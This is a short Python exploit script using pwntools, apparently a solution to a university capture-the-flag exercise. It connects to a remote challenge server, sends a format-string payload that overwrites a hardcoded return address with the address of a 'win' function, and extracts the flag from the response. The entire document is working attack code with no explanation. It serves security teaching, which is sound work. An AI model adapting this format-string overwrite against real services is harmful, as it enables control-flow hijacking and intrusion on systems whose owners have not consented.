from pwn import *

elf = ELF('08_return')
win_address =  elf.symbols['win']
return_address = 0xffffdc4c

SERVER = 'mustard.stt.rnl.tecnico.ulisboa.pt'
PORT = 25198

s = remote(SERVER, PORT, timeout=9999)
payload = fmtstr_payload(7, {return_address: win_address})
s.sendline(payload)
response = s.recvall().decode(errors = 'ignore')
flag = re.search("SSof{.*}", response).group(0)
print(flag)

